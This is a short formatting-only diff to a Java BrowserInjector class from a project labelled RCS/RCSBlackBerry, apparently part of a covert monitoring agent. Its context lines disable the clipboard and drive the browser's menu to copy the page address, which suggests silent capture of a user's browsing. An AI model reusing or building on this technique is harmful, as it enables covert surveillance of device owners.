@@ -6,7 +6,7 @@
  * 
  * Project      : RCS, RCSBlackBerry
  * *************************************************/
-	
+
 package blackberry.injection.injectors;
 
 import net.rim.device.api.system.Clipboard;
@@ -75,7 +75,7 @@ public class BrowserInjector extends UrlGroupInjector {
         //#endif    
 
         //TODO: in messages
-        String[] menuName = new String[] {"Copy Page Address", "Copy Address"};
+        String[] menuName = new String[] { "Copy Page Address", "Copy Address" };
 
         disableClipboard();
         boolean ret = MenuWalker.walk(menuName, screen, true);
